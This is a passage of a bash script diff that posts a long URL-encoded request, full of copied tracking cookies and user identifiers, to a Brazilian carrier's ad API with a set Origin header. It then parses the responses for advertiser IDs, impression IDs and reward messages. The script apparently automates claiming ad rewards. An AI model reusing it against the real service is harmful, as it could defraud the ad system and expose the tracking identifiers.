68184449230620631777943451298409598%3Bvivoregcity%3Dsaopaulo%3Bvivoregstate%3DSP%3Bregional%3DSP%3Bvivoregddd%3D11%3Bhjid%3Ded626780d5f94597b12dbf03c573f476%3Bcsc%3D1%3BCTRS%3DRecording%3BWRUIDCD%3D3474032550068585%3BAMCVF93F88C35ABCCD070A495CF840AdobeOrg%3D11241066807CMCIDTS7C188917CMCMID7C289750017116187312115408938543902396647CMCAAMLH16328724437C47CMCAAMB16328724437CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y7CMCOPTOUT1632274843s7CNONE7CMCCIDH7C13319136787CvVersion7C520%3BgaGB9C14SX2D%3DGS11163426222641163426223353%3Bmbox%3DPCb79201a4e076420fae9791f9d7f0dfe03401697507058session4a5c091cceb640788043d68dd4a2760c1634264118%3Buetvid%3D61b5c3602d5911ecaf54af42512bd134%3BgaDMLPJDP0E3%3DGS1116342622412116342622570%3Bcsid%3D7446c9b6736da532ae8de6f48f892f14163210852331634262259163426224815871178651666272523390%3BCTData%3Dgpv%3D5ckp%3Dcddm%3Dvivocombrapv15www44%3D6cpv15www44%3D5rpv15www44%3D4%3Bga%3DGA1315675778471631021157%3Bgid%3DGA1320601804671634423603%3Bttnprf%3D%3Bttcvmt%3D1634529633%3Bttcc%3Ddirect%3Bttcs%3Ddirect%3Bttcm%3Ddirect%3Bttuus%3D1634531616272%3Bos%3Dandroid%3BtailCity%3Dsalvador%3BtailtState%3Dbahia%3BtailCountry%3Dbr%3BtailEquipment%3D9%3BtailGender%3D1%22%7D%2C%7B%22slotId%22%3A100%2C%22target%22%3A%22os%3Dandroid%3BtailCity%3Dsalvador%3BtailtState%3Dbahia%3BtailCountry%3Dbr%3BtailEquipment%3D9%3BtailGender%3D1%22%7D%2C%7B%22slotId%22%3A1001%2C%22target%22%3A%22slot%3D1001%3Baamat%3Daamat3D19882337%3Badobeaamcookie%3DpossePre3D163978882Caamat3D19882337%3Bttu%3D0100007FD8F82C614D0723620299EE11%3Bgclau%3D1118538882921632093158%3BgaZX7D4NYJHK%3DGS11163209315710163209317146%3Bvivoprettycity%3DUyVDMyVBM28rUGF1bG8%3D%3Bfbp%3Dfb216321025485331651747283%3Baamuuid%3D27368184449230620631777943451298409598%3Bvivoregcity%3Dsaopaulo%3Bvivoregstate%3DSP%3Bregional%3DSP%3Bvivoregddd%3D11%3Bhjid%3Ded626780d5f94597b12dbf03c573f476%3Bcsc%3D1%3BCTRS%3DRecording%3BWRUIDCD%3D3474032550068585%3BAMCVF93F88C35ABCCD070A495CF840AdobeOrg%3D11241066807CMCIDTS7C188917CMCMID7C289750017116187312115408938543902396647CMCAAMLH16328724437C47CMCAAMB16328724437CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y7CMCOPTOUT1632274843s7CNONE7CMCCIDH7C13319136787CvVersion7C520%3BgaGB9C14SX2D%3DGS11163426222641163426223353%3Bmbox%3DPCb79201a4e076420fae9791f9d7f0dfe03401697507058session4a5c091cceb640788043d68dd4a2760c1634264118%3Buetvid%3D61b5c3602d5911ecaf54af42512bd134%3BgaDMLPJDP0E3%3DGS1116342622412116342622570%3Bcsid%3D7446c9b6736da532ae8de6f48f892f14163210852331634262259163426224815871178651666272523390%3BCTData%3Dgpv%3D5ckp%3Dcddm%3Dvivocombrapv15www44%3D6cpv15www44%3D5rpv15www44%3D4%3Bga%3DGA1315675778471631021157%3Bgid%3DGA1320601804671634423603%3Bttnprf%3D%3Bttcvmt%3D1634529633%3Bttcc%3Ddirect%3Bttcs%3Ddirect%3Bttcm%3Ddirect%3Bttuus%3D1634531616272%3Bos%3Dandroid%3BtailCity%3Dsalvador%3BtailtState%3Dbahia%3BtailCountry%3Dbr%3BtailEquipment%3D9%3BtailGender%3D1%22%7D%2C%7B%22slotId%22%3A1002%2C%22target%22%3A%22slot%3D1002%3Baamat%3Daamat3D19882337%3Badobeaamcookie%3DpossePre3D163978882Caamat3D19882337%3Bttu%3D0100007FD8F82C614D0723620299EE11%3Bgclau%3D1118538882921632093158%3BgaZX7D4NYJHK%3DGS11163209315710163209317146%3Bvivoprettycity%3DUyVDMyVBM28rUGF1bG8%3D%3Bfbp%3Dfb216321025485331651747283%3Baamuuid%3D27368184449230620631777943451298409598%3Bvivoregcity%3Dsaopaulo%3Bvivoregstate%3DSP%3Bregional%3DSP%3Bvivoregddd%3D11%3Bhjid%3Ded626780d5f94597b12dbf03c573f476%3Bcsc%3D1%3BCTRS%3DRecording%3BWRUIDCD%3D3474032550068585%3BAMCVF93F88C35ABCCD070A495CF840AdobeOrg%3D11241066807CMCIDTS7C188917CMCMID7C289750017116187312115408938543902396647CMCAAMLH16328724437C47CMCAAMB16328724437CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y7CMCOPTOUT1632274843s7CNONE7CMCCIDH7C13319136787CvVersion7C520%3BgaGB9C14SX2D%3DGS11163426222641163426223353%3Bmbox%3DPCb79201a4e076420fae9791f9d7f0dfe03401697507058session4a5c091cceb640788043d68dd4a2760c1634264118%3Buetvid%3D61b5c3602d5911ecaf54af42512bd134%3BgaDMLPJDP0E3%3DGS1116342622412116342622570%3Bcsid%3D7446c9b6736da532ae8de6f48f892f14163210852331634262259163426224815871178651666272523390%3BCTData%3Dgpv%3D5ckp%3Dcddm%3Dvivocombrapv15www44%3D6cpv15www44%3D5rpv15www44%3D4%3Bga%3DGA1315675778471631021157%3Bgid%3DGA1320601804671634423603%3Bttnprf%3D%3Bttcvmt%3D1634529633%3Bttcc%3Ddirect%3Bttcs%3Ddirect%3Bttcm%3Ddirect%3Bttuus%3D1634531616272%3Bos%3Dandroid%3BtailCity%3Dsalvador%3BtailtState%3Dbahia%3BtailCountry%3Dbr%3BtailEquipment%3D9%3BtailGender%3D1%22%7D%2C%7B%22slotId%22%3A1003%2C%22target%22%3A%22slot%3D1003%3Baamat%3Daamat3D19882337%3Badobeaamcookie%3DpossePre3D163978882Caamat3D19882337%3Bttu%3D0100007FD8F82C614D0723620299EE11%3Bgclau%3D1118538882921632093158%3BgaZX7D4NYJHK%3DGS11163209315710163209317146%3Bvivoprettycity%3DUyVDMyVBM28rUGF1bG8%3D%3Bfbp%3Dfb216321025485331651747283%3Baamuuid%3D27368184449230620631777943451298409598%3Bvivoregcity%3Dsaopaulo%3Bvivoregstate%3DSP%3Bregional%3DSP%3Bvivoregddd%3D11%3Bhjid%3Ded626780d5f94597b12dbf03c573f476%3Bcsc%3D1%3BCTRS%3DRecording%3BWRUIDCD%3D3474032550068585%3BAMCVF93F88C35ABCCD070A495CF840AdobeOrg%3D11241066807CMCIDTS7C188917CMCMID7C289750017116187312115408938543902396647CMCAAMLH16328724437C47CMCAAMB16328724437CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y7CMCOPTOUT1632274843s7CNONE7CMCCIDH7C13319136787CvVersion7C520%3BgaGB9C14SX2D%3DGS11163426222641163426223353%3Bmbox%3DPCb79201a4e076420fae9791f9d7f0dfe03401697507058session4a5c091cceb640788043d68dd4a2760c1634264118%3Buetvid%3D61b5c3602d5911ecaf54af42512bd134%3BgaDMLPJDP0E3%3DGS1116342622412116342622570%3Bcsid%3D7446c9b6736da532ae8de6f48f892f14163210852331634262259163426224815871178651666272523390%3BCTData%3Dgpv%3D5ckp%3Dcddm%3Dvivocombrapv15www44%3D6cpv15www44%3D5rpv15www44%3D4%3Bga%3DGA1315675778471631021157%3Bgid%3DGA1320601804671634423603%3Bttnprf%3D%3Bttcvmt%3D1634529633%3Bttcc%3Ddirect%3Bttcs%3Ddirect%3Bttcm%3Ddirect%3Bttuus%3D1634531616272%3Bos%3Dandroid%3BtailCity%3Dsalvador%3BtailtState%3Dbahia%3BtailCountry%3Dbr%3BtailEquipment%3D9%3BtailGender%3D1%22%7D%2C%7B%22slotId%22%3A1004%2C%22target%22%3A%22slot%3D1004%3Baamat%3Daamat3D19882337%3Badobeaamcookie%3DpossePre3D163978882Caamat3D19882337%3Bttu%3D0100007FD8F82C614D0723620299EE11%3Bgclau%3D1118538882921632093158%3BgaZX7D4NYJHK%3DGS11163209315710163209317146%3Bvivoprettycity%3DUyVDMyVBM28rUGF1bG8%3D%3Bfbp%3Dfb216321025485331651747283%3Baamuuid%3D27368184449230620631777943451298409598%3Bvivoregcity%3Dsaopaulo%3Bvivoregstate%3DSP%3Bregional%3DSP%3Bvivoregddd%3D11%3Bhjid%3Ded626780d5f94597b12dbf03c573f476%3Bcsc%3D1%3BCTRS%3DRecording%3BWRUIDCD%3D3474032550068585%3BAMCVF93F88C35ABCCD070A495CF840AdobeOrg%3D11241066807CMCIDTS7C188917CMCMID7C289750017116187312115408938543902396647CMCAAMLH16328724437C47CMCAAMB16328724437CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y7CMCOPTOUT1632274843s7CNONE7CMCCIDH7C13319136787CvVersion7C520%3BgaGB9C14SX2D%3DGS11163426222641163426223353%3Bmbox%3DPCb79201a4e076420fae9791f9d7f0dfe03401697507058session4a5c091cceb640788043d68dd4a2760c1634264118%3Buetvid%3D61b5c3602d5911ecaf54af42512bd134%3BgaDMLPJDP0E3%3DGS1116342622412116342622570%3Bcsid%3D7446c9b6736da532ae8de6f48f892f14163210852331634262259163426224815871178651666272523390%3BCTData%3Dgpv%3D5ckp%3Dcddm%3Dvivocombrapv15www44%3D6cpv15www44%3D5rpv15www44%3D4%3Bga%3DGA1315675778471631021157%3Bgid%3DGA1320601804671634423603%3Bttnprf%3D%3Bttcvmt%3D1634529633%3Bttcc%3Ddirect%3Bttcs%3Ddirect%3Bttcm%3Ddirect%3Bttuus%3D1634531616272%3Bos%3Dandroid%3BtailCity%3Dsalvador%3BtailtState%3Dbahia%3BtailCountry%3Dbr%3BtailEquipment%3D9%3BtailGender%3D1%22%7D%2C%7B%22slotId%22%3A1005%2C%22target%22%3A%22slot%3D1005%3Baamat%3Daamat3D19882337%3Badobeaamcookie%3DpossePre3D163978882Caamat3D19882337%3Bttu%3D0100007FD8F82C614D0723620299EE11%3Bgclau%3D1118538882921632093158%3BgaZX7D4NYJHK%3DGS11163209315710163209317146%3Bvivoprettycity%3DUyVDMyVBM28rUGF1bG8%3D%3Bfbp%3Dfb216321025485331651747283%3Baamuuid%3D27368184449230620631777943451298409598%3Bvivoregcity%3Dsaopaulo%3Bvivoregstate%3DSP%3Bregional%3DSP%3Bvivoregddd%3D11%3Bhjid%3Ded626780d5f94597b12dbf03c573f476%3Bcsc%3D1%3BCTRS%3DRecording%3BWRUIDCD%3D3474032550068585%3BAMCVF93F88C35ABCCD070A495CF840AdobeOrg%3D11241066807CMCIDTS7C188917CMCMID7C289750017116187312115408938543902396647CMCAAMLH16328724437C47CMCAAMB16328724437CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y7CMCOPTOUT1632274843s7CNONE7CMCCIDH7C13319136787CvVersion7C520%3BgaGB9C14SX2D%3DGS11163426222641163426223353%3Bmbox%3DPCb79201a4e076420fae9791f9d7f0dfe03401697507058session4a5c091cceb640788043d68dd4a2760c1634264118%3Buetvid%3D61b5c3602d5911ecaf54af42512bd134%3BgaDMLPJDP0E3%3DGS1116342622412116342622570%3Bcsid%3D7446c9b6736da532ae8de6f48f892f14163210852331634262259163426224815871178651666272523390%3BCTData%3Dgpv%3D5ckp%3Dcddm%3Dvivocombrapv15www44%3D6cpv15www44%3D5rpv15www44%3D4%3Bga%3DGA1315675778471631021157%3Bgid%3DGA1320601804671634423603%3Bttnprf%3D%3Bttcvmt%3D1634529633%3Bttcc%3Ddirect%3Bttcs%3Ddirect%3Bttcm%3Ddirect%3Bttuus%3D1634531616272%3Bos%3Dandroid%3BtailCity%3Dsalvador%3BtailtState%3Dbahia%3BtailCountry%3Dbr%3BtailEquipment%3D9%3BtailGender%3D1%22%7D%2C%7B%22slotId%22%3A1006%2C%22target%22%3A%22slot%3D1006%3Baamat%3Daamat3D19882337%3Badobeaamcookie%3DpossePre3D163978882Caamat3D19882337%3Bttu%3D0100007FD8F82C614D0723620299EE11%3Bgclau%3D1118538882921632093158%3BgaZX7D4NYJHK%3DGS11163209315710163209317146%3Bvivoprettycity%3DUyVDMyVBM28rUGF1bG8%3D%3Bfbp%3Dfb216321025485331651747283%3Baamuuid%3D27368184449230620631777943451298409598%3Bvivoregcity%3Dsaopaulo%3Bvivoregstate%3DSP%3Bregional%3DSP%3Bvivoregddd%3D11%3Bhjid%3Ded626780d5f94597b12dbf03c573f476%3Bcsc%3D1%3BCTRS%3DRecording%3BWRUIDCD%3D3474032550068585%3BAMCVF93F88C35ABCCD070A495CF840AdobeOrg%3D11241066807CMCIDTS7C188917CMCMID7C289750017116187312115408938543902396647CMCAAMLH16328724437C47CMCAAMB16328724437CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y7CMCOPTOUT1632274843s7CNONE7CMCCIDH7C13319136787CvVersion7C520%3BgaGB9C14SX2D%3DGS11163426222641163426223353%3Bmbox%3DPCb79201a4e076420fae9791f9d7f0dfe03401697507058session4a5c091cceb640788043d68dd4a2760c1634264118%3Buetvid%3D61b5c3602d5911ecaf54af42512bd134%3BgaDMLPJDP0E3%3DGS1116342622412116342622570%3Bcsid%3D7446c9b6736da532ae8de6f48f892f14163210852331634262259163426224815871178651666272523390%3BCTData%3Dgpv%3D5ckp%3Dcddm%3Dvivocombrapv15www44%3D6cpv15www44%3D5rpv15www44%3D4%3Bga%3DGA1315675778471631021157%3Bgid%3DGA1320601804671634423603%3Bttnprf%3D%3Bttcvmt%3D1634529633%3Bttcc%3Ddirect%3Bttcs%3Ddirect%3Bttcm%3Ddirect%3Bttuus%3D1634531616272%3Bos%3Dandroid%3BtailCity%3Dsalvador%3BtailtState%3Dbahia%3BtailCountry%3Dbr%3BtailEquipment%3D9%3BtailGender%3D1%22%7D%2C%7B%22slotId%22%3A1007%2C%22target%22%3A%22slot%3D1007%3Baamat%3Daamat3D19882337%3Badobeaamcookie%3DpossePre3D163978882Caamat3D19882337%3Bttu%3D0100007FD8F82C614D0723620299EE11%3Bgclau%3D1118538882921632093158%3BgaZX7D4NYJHK%3DGS11163209315710163209317146%3Bvivoprettycity%3DUyVDMyVBM28rUGF1bG8%3D%3Bfbp%3Dfb216321025485331651747283%3Baamuuid%3D27368184449230620631777943451298409598%3Bvivoregcity%3Dsaopaulo%3Bvivoregstate%3DSP%3Bregional%3DSP%3Bvivoregddd%3D11%3Bhjid%3Ded626780d5f94597b12dbf03c573f476%3Bcsc%3D1%3BCTRS%3DRecording%3BWRUIDCD%3D3474032550068585%3BAMCVF93F88C35ABCCD070A495CF840AdobeOrg%3D11241066807CMCIDTS7C188917CMCMID7C289750017116187312115408938543902396647CMCAAMLH16328724437C47CMCAAMB16328724437CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y7CMCOPTOUT1632274843s7CNONE7CMCCIDH7C13319136787CvVersion7C520%3BgaGB9C14SX2D%3DGS11163426222641163426223353%3Bmbox%3DPCb79201a4e076420fae9791f9d7f0dfe03401697507058session4a5c091cceb640788043d68dd4a2760c1634264118%3Buetvid%3D61b5c3602d5911ecaf54af42512bd134%3BgaDMLPJDP0E3%3DGS1116342622412116342622570%3Bcsid%3D7446c9b6736da532ae8de6f48f892f14163210852331634262259163426224815871178651666272523390%3BCTData%3Dgpv%3D5ckp%3Dcddm%3Dvivocombrapv15www44%3D6cpv15www44%3D5rpv15www44%3D4%3Bga%3DGA1315675778471631021157%3Bgid%3DGA1320601804671634423603%3Bttnprf%3D%3Bttcvmt%3D1634529633%3Bttcc%3Ddirect%3Bttcs%3Ddirect%3Bttcm%3Ddirect%3Bttuus%3D1634531616272%3Bos%3Dandroid%3BtailCity%3Dsalvador%3BtailtState%3Dbahia%3BtailCountry%3Dbr%3BtailEquipment%3D9%3BtailGender%3D1%22%7D%2C%7B%22slotId%22%3A1008%2C%22target%22%3A%22slot%3D1008%3Baamat%3Daamat3D19882337%3Badobeaamcookie%3DpossePre3D163978882Caamat3D19882337%3Bttu%3D0100007FD8F82C614D0723620299EE11%3Bgclau%3D1118538882921632093158%3BgaZX7D4NYJHK%3DGS11163209315710163209317146%3Bvivoprettycity%3DUyVDMyVBM28rUGF1bG8%3D%3Bfbp%3Dfb216321025485331651747283%3Baamuuid%3D27368184449230620631777943451298409598%3Bvivoregcity%3Dsaopaulo%3Bvivoregstate%3DSP%3Bregional%3DSP%3Bvivoregddd%3D11%3Bhjid%3Ded626780d5f94597b12dbf03c573f476%3Bcsc%3D1%3BCTRS%3DRecording%3BWRUIDCD%3D3474032550068585%3BAMCVF93F88C35ABCCD070A495CF840AdobeOrg%3D11241066807CMCIDTS7C188917CMCMID7C289750017116187312115408938543902396647CMCAAMLH16328724437C47CMCAAMB16328724437CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y7CMCOPTOUT1632274843s7CNONE7CMCCIDH7C13319136787CvVersion7C520%3BgaGB9C14SX2D%3DGS11163426222641163426223353%3Bmbox%3DPCb79201a4e076420fae9791f9d7f0dfe03401697507058session4a5c091cceb640788043d68dd4a2760c1634264118%3Buetvid%3D61b5c3602d5911ecaf54af42512bd134%3BgaDMLPJDP0E3%3DGS1116342622412116342622570%3Bcsid%3D7446c9b6736da532ae8de6f48f892f14163210852331634262259163426224815871178651666272523390%3BCTData%3Dgpv%3D5ckp%3Dcddm%3Dvivocombrapv15www44%3D6cpv15www44%3D5rpv15www44%3D4%3Bga%3DGA1315675778471631021157%3Bgid%3DGA1320601804671634423603%3Bttnprf%3D%3Bttcvmt%3D1634529633%3Bttcc%3Ddirect%3Bttcs%3Ddirect%3Bttcm%3Ddirect%3Bttuus%3D1634531616272%3Bos%3Dandroid%3BtailCity%3Dsalvador%3BtailtState%3Dbahia%3BtailCountry%3Dbr%3BtailEquipment%3D9%3BtailGender%3D1%22%7D%2C%7B%22slotId%22%3A1009%2C%22target%22%3A%22slot%3D1009%3Baamat%3Daamat3D19882337%3Badobeaamcookie%3DpossePre3D163978882Caamat3D19882337%3Bttu%3D0100007FD8F82C614D0723620299EE11%3Bgclau%3D1118538882921632093158%3BgaZX7D4NYJHK%3DGS11163209315710163209317146%3Bvivoprettycity%3DUyVDMyVBM28rUGF1bG8%3D%3Bfbp%3Dfb216321025485331651747283%3Baamuuid%3D27368184449230620631777943451298409598%3Bvivoregcity%3Dsaopaulo%3Bvivoregstate%3DSP%3Bregional%3DSP%3Bvivoregddd%3D11%3Bhjid%3Ded626780d5f94597b12dbf03c573f476%3Bcsc%3D1%3BCTRS%3DRecording%3BWRUIDCD%3D3474032550068585%3BAMCVF93F88C35ABCCD070A495CF840AdobeOrg%3D11241066807CMCIDTS7C188917CMCMID7C289750017116187312115408938543902396647CMCAAMLH16328724437C47CMCAAMB16328724437CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y7CMCOPTOUT1632274843s7CNONE7CMCCIDH7C13319136787CvVersion7C520%3BgaGB9C14SX2D%3DGS11163426222641163426223353%3Bmbox%3DPCb79201a4e076420fae9791f9d7f0dfe03401697507058session4a5c091cceb640788043d68dd4a2760c1634264118%3Buetvid%3D61b5c3602d5911ecaf54af42512bd134%3BgaDMLPJDP0E3%3DGS1116342622412116342622570%3Bcsid%3D7446c9b6736da532ae8de6f48f892f14163210852331634262259163426224815871178651666272523390%3BCTData%3Dgpv%3D5ckp%3Dcddm%3Dvivocombrapv15www44%3D6cpv15www44%3D5rpv15www44%3D4%3Bga%3DGA1315675778471631021157%3Bgid%3DGA1320601804671634423603%3Bttnprf%3D%3Bttcvmt%3D1634529633%3Bttcc%3Ddirect%3Bttcs%3Ddirect%3Bttcm%3Ddirect%3Bttuus%3D1634531616272%3Bos%3Dandroid%3BtailCity%3Dsalvador%3BtailtState%3Dbahia%3BtailCountry%3Dbr%3BtailEquipment%3D9%3BtailGender%3D1%22%7D%2C%7B%22slotId%22%3A1010%2C%22target%22%3A%22slot%3D1010%3Baamat%3Daamat3D19882337%3Badobeaamcookie%3DpossePre3D163978882Caamat3D19882337%3Bttu%3D0100007FD8F82C614D0723620299EE11%3Bgclau%3D1118538882921632093158%3BgaZX7D4NYJHK%3DGS11163209315710163209317146%3Bvivoprettycity%3DUyVDMyVBM28rUGF1bG8%3D%3Bfbp%3Dfb216321025485331651747283%3Baamuuid%3D27368184449230620631777943451298409598%3Bvivoregcity%3Dsaopaulo%3Bvivoregstate%3DSP%3Bregional%3DSP%3Bvivoregddd%3D11%3Bhjid%3Ded626780d5f94597b12dbf03c573f476%3Bcsc%3D1%3BCTRS%3DRecording%3BWRUIDCD%3D3474032550068585%3BAMCVF93F88C35ABCCD070A495CF840AdobeOrg%3D11241066807CMCIDTS7C188917CMCMID7C289750017116187312115408938543902396647CMCAAMLH16328724437C47CMCAAMB16328724437CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y7CMCOPTOUT1632274843s7CNONE7CMCCIDH7C13319136787CvVersion7C520%3BgaGB9C14SX2D%3DGS11163426222641163426223353%3Bmbox%3DPCb79201a4e076420fae9791f9d7f0dfe03401697507058session4a5c091cceb640788043d68dd4a2760c1634264118%3Buetvid%3D61b5c3602d5911ecaf54af42512bd134%3BgaDMLPJDP0E3%3DGS1116342622412116342622570%3Bcsid%3D7446c9b6736da532ae8de6f48f892f14163210852331634262259163426224815871178651666272523390%3BCTData%3Dgpv%3D5ckp%3Dcddm%3Dvivocombrapv15www44%3D6cpv15www44%3D5rpv15www44%3D4%3Bga%3DGA1315675778471631021157%3Bgid%3DGA1320601804671634423603%3Bttnprf%3D%3Bttcvmt%3D1634529633%3Bttcc%3Ddirect%3Bttcs%3Ddirect%3Bttcm%3Ddirect%3Bttuus%3D1634531616272%3Bos%3Dandroid%3BtailCity%3Dsalvador%3BtailtState%3Dbahia%3BtailCountry%3Dbr%3BtailEquipment%3D9%3BtailGender%3D1%22%7D%2C%7B%22slotId%22%3A1114%2C%22target%22%3A%22slot%3D1114%3Baamat%3Daamat3D19882337%3Badobeaamcookie%3DpossePre3D163978882Caamat3D19882337%3Bttu%3D0100007FD8F82C614D0723620299EE11%3Bgclau%3D1118538882921632093158%3BgaZX7D4NYJHK%3DGS11163209315710163209317146%3Bvivoprettycity%3DUyVDMyVBM28rUGF1bG8%3D%3Bfbp%3Dfb216321025485331651747283%3Baamuuid%3D27368184449230620631777943451298409598%3Bvivoregcity%3Dsaopaulo%3Bvivoregstate%3DSP%3Bregional%3DSP%3Bvivoregddd%3D11%3Bhjid%3Ded626780d5f94597b12dbf03c573f476%3Bcsc%3D1%3BCTRS%3DRecording%3BWRUIDCD%3D3474032550068585%3BAMCVF93F88C35ABCCD070A495CF840AdobeOrg%3D11241066807CMCIDTS7C188917CMCMID7C289750017116187312115408938543902396647CMCAAMLH16328724437C47CMCAAMB16328724437CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y7CMCOPTOUT1632274843s7CNONE7CMCCIDH7C13319136787CvVersion7C520%3BgaGB9C14SX2D%3DGS11163426222641163426223353%3Bmbox%3DPCb79201a4e076420fae9791f9d7f0dfe03401697507058session4a5c091cceb640788043d68dd4a2760c1634264118%3Buetvid%3D61b5c3602d5911ecaf54af42512bd134%3BgaDMLPJDP0E3%3DGS1116342622412116342622570%3Bcsid%3D7446c9b6736da532ae8de6f48f892f14163210852331634262259163426224815871178651666272523390%3BCTData%3Dgpv%3D5ckp%3Dcddm%3Dvivocombrapv15www44%3D6cpv15www44%3D5rpv15www44%3D4%3Bga%3DGA1315675778471631021157%3Bgid%3DGA1320601804671634423603%3Bttnprf%3D%3Bttcvmt%3D1634529633%3Bttcc%3Ddirect%3Bttcs%3Ddirect%3Bttcm%3Ddirect%3Bttuus%3D1634531616272%3Bos%3Dandroid%3BtailCity%3Dsalvador%3BtailtState%3Dbahia%3BtailCountry%3Dbr%3BtailEquipment%3D9%3BtailGender%3D1%22%7D%5D&pageId=655437&insertionId=&insertionUUID=&insertionType=NATIVE%2CNATIVE%2CNATIVE%2CNATIVE%2CNATIVE%2CNATIVE%2CNATIVE%2CNATIVE%2CANY%2CNATIVE%2CNATIVE%2CNATIVE%2CNATIVE%2CNATIVE%2CNATIVE%2CNATIVE%2CNATIVE%2CNATIVE%2CNATIVE%2CNATIVE&referer=&accessPass=$AccessPass" http://e.vivo.ddivulga.com/api/v2.1/fetch -H "Origin:http://navegue.vivo.com.br") 
+
+ClubeFacilAds=$(echo -e "$X9ClubeFacil" | grep -o ...........................ClubeFacil_ESP..............................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................)
+
+ClubeFacilAds2=$(echo -e "$X9ClubeFacil" | grep -o "...........................VitrineSVA Scomm ClubeFacil_AGO21.......................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................")
+
+echo -e "$X9deToken4" >> tokencreatorrev.txt
+echo -e "$X9deToken2" >> tokencreatorrev.txt
+echo -e "$X9deToken3" >> tokencreatorrev.txt
+echo -e "$ClubeFacilAds" >> tokencreatorrev.txt
+echo -e "$ClubeFacilAds2" >> tokencreatorrev.txt
+echo -e "$X9deToken" >> tokencreatorrev.txt
+
+
+advid=$(cat tokencreatorrev.txt | grep -a -i -o advid..............| cut -d':' -f2 | cut -d'"' -f1)
+echo -e "$advid" >> advidrev.txt
+
+impressionid=$(cat tokencreatorrev.txt | grep -a -i -o impressionEventId......................................... | cut -d'"' -f3)
+echo -e "$impressionid" >> impressionidrev.txt
+
+advname=$(cat tokencreatorrev.txt | grep -o advName.............................................................................................. | cut -d '"' -f3-4)
+
+echo -e "$advname" >> advnamerev.txt
+
+advreward=$(cat tokencreatorrev.txt | grep -o rewardWebMessage2........................................................................................ | cut -d'"' -f1-3 | cut -d'.' -f1 | cut -d',' -f1)
+
+echo -e "$advreward" >> advrewardrev.txt
+
+advmensagem=$(cat tokencreatorrev.txt | grep -o headlineWebmessage1......................................................................... | cut -d'"' -f2-3)
+
+echo -e "$advmensagem" >> advmensagemrev.txt
+
+advmensagem001=$(cat advmensagemrev.txt | grep -n '"' | grep "1:" | cut -d'"' -f2 | cut -d":" -f1 | cut -d'<' -f1 | cut -d'.' -f1 )
+advmensagem002=$(cat advmensagemrev.txt | grep -n '"' | grep "2:" | cut -d'"' -f2 | cut -d":" -f1 | cut -d'<' -f1 | cut -d'.' -f1 )
+advmensagem003=$(cat advmensagemrev.txt | grep -n '"' | grep "3:" | cut -d'"' -f2 | cut -d":" -f1 | cut -d'<' -f1 | cut -d'.' -f1 )
+advmensagem004=$(cat advmensagemrev.txt | grep -n '"' | grep "4:" | cut -d'"' -f2 | cut -d":" -f1 | cut -d'<' -f1 | cut -d'.' -f1 )
+advmensagem005=$(cat advmensagemrev.txt | grep -n '"' | grep "5:" | cut -d'"' -f2 | cut -d":" -f1 | cut -d'<' -f1 | cut -d'.' -f1 )
+advmensagem006=$(cat advmensagemrev.txt | grep -n '"' | grep "6:" | cut -d'"' -f2 | cut -d":" -f1 | cut -d'<' -f1 | cut -d'.' -f1 )
+advmensagem007=$(cat advmensagemrev.txt | grep -n '"' | grep "7:" | cut -d'"' -f2 | cut -d":" -f1 | cut -d'<' -f1 | cut -d'.' -f1 )
+advmensagem008=$(cat advmensagemrev.txt | grep -n '"' | grep "8:" | cut -d'"' -f2 | cut -d":" -f1 | cut -d'<' -f1 | cut -d'.' -f1 )
+advmensagem009=$(cat advmensagemrev.txt | grep -n '"' | grep "9:" | cut -d'"' -f2 | cut -d":" -f1 | cut -d'<' -f1 | cut -d'.' -f1 )
+advmensagem0010=$(cat advmensagemrev.txt | grep -n '"' | grep "10:" | cut -d'"' -f2 | cut -d":" -f1 | cut -d'<' -f1 | cut -d'.' -f1 )
+
+
+advreward001=$(cat advrewardrev.txt | grep -n '"' | grep "1:" | cut -d'"' -f2-3)
+advreward002=$(cat advrewardrev.txt | grep -n '"' | grep "2:" | cut -d'"' -f2-3)
+advreward003=$(cat advrewardrev.txt | grep -n '"' | grep "3:" | cut -d'"' -f2-3)
+advreward004=$(cat advrewardrev.txt | grep -n '"' | grep "4:" | cut -d'"' -f2-3)
+advreward005=$(cat advrewardrev.txt | grep -n '"' | grep "5:" | cut -d'"' -f2-3)
+advreward006=$(cat advrewardrev.txt | grep -n '"' | grep "6:" | cut -d'"' -f2-3)
+advreward007=$(cat advrewardrev.txt | grep -n '"' | grep "7:" | cut -d'"' -f2-3)
+advreward008=$(cat advrewardrev.txt | grep -n '"' | grep "8:" | cut -d'"' -f2-3)
+advreward009=$(cat advrewardrev.txt | grep -n '"' | grep "9:" | cut -d'"' -f2-3)
+advreward0010=$(cat advrewardrev.txt | grep -n '"' | grep "10:" | cut -d'"' -f2-3)
+
+
+advname001=$(cat advnamerev.txt | grep -n '"' | grep "1:" | cut -d':' -f2)
+advname002=$(cat advnamerev.txt | grep -n '"' | grep "2:" | cut -d':' -f2)
+advname003=$(cat advnamerev.txt | grep -n '"' | grep "3:" | cut -d':' -f2)
+advname004=$(cat advnamerev.txt | grep -n '"' | grep "4:" | cut -d':' -f2)
+advname005=$(cat advnamerev.txt | grep -n '"' | grep "5:" | cut -d':' -f2)
+advname006=$(cat advnamerev.txt | grep -n '"' | grep "6:" | cut -d':' -f2)
+advname007=$(cat advnamerev.txt | grep -n '"' | grep "7:" | cut -d':' -f2)
+advname008=$(cat advnamerev.txt | grep -n '"' | grep "8:" | cut -d':' -f2)
